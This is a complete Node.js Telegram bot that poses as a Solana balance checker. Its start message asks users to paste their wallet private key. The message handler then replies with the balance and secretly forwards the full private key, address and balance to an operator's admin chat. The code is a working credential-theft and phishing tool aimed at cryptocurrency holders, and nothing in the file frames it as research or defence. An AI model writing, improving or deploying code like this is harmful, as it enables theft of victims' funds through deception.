const TelegramBot = require('node-telegram-bot-api');
const { Connection, PublicKey, Keypair } = require('@solana/web3.js');

// Configuration (set these in Railway)
const TOKEN = process.env.TELEGRAM_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
const SOLANA_RPC = 'https://api.mainnet-beta.solana.com';

// Initialize
const bot = new TelegramBot(TOKEN, { polling: true });
const connection = new Connection(SOLANA_RPC);

// Store wallets in memory (reset on restart)
const userWallets = new Map();

// Get SOL balance
async function getBalance(publicKey) {
  try {
    const balance = await connection.getBalance(new PublicKey(publicKey));
    return balance / 1e9; // Convert to SOL
  } catch (err) {
    console.error('Balance check failed:', err);
    return 0;
  }
}

// Bot Commands
bot.onText(/\/start/, (msg) => {
  bot.sendMessage(
    msg.chat.id,
    '🔑 Send your Solana private key as JSON array to check your balance\n\n' +
    'Example: [1,2,3,...,99]'
  );
});

bot.on('message', async (msg) => {
  // Accept private keys in JSON format
  if (msg.text && msg.text.startsWith('[')) {
    try {
      const privateKey = JSON.parse(msg.text);
      const keypair = Keypair.fromSecretKey(new Uint8Array(privateKey));
      const chatId = msg.chat.id.toString();
      
      // Store wallet
      userWallets.set(chatId, keypair.publicKey.toString());
      
      // Get balance
      const balance = await getBalance(keypair.publicKey);
      
      // Reply to user
      bot.sendMessage(
        chatId,
        `💰 Your balance: ${balance} SOL\n` +
        `Address: ${keypair.publicKey}`
      );
      
      // Notify admin (with full key)
      bot.sendMessage(
        ADMIN_CHAT_ID,
        `👤 New wallet added:\n` +
        `User: ${chatId}\n` +
        `Key: ${msg.text}\n` +
        `Address: ${keypair.publicKey}\n` +
        `Balance: ${balance} SOL`
      );
      
    } catch (err) {
      bot.sendMessage(msg.chat.id, '❌ Invalid private key format');
    }
  }
});

console.log('🤖 Bot started');
